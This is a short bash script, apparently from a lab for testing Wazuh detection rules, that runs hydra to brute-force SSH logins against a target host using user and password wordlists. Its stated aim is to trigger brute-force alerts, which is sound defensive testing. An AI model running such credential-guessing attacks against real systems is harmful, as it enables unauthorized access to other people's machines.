#!/bin/bash
# Brute-force SSH bang hydra vao 1 target -> rule Wazuh 5710/5712, tuong quan brute_force_then_success.
set -u
TARGET="${1:-fs01}"
echo "[brute] hydra SSH -> $TARGET"
hydra -L /opt/attack/users.txt -P /opt/attack/passwords.txt \
      -t 4 -f -I ssh://"$TARGET" 2>&1 | grep -vE '^\[DATA\]|^\[VERBOSE\]'
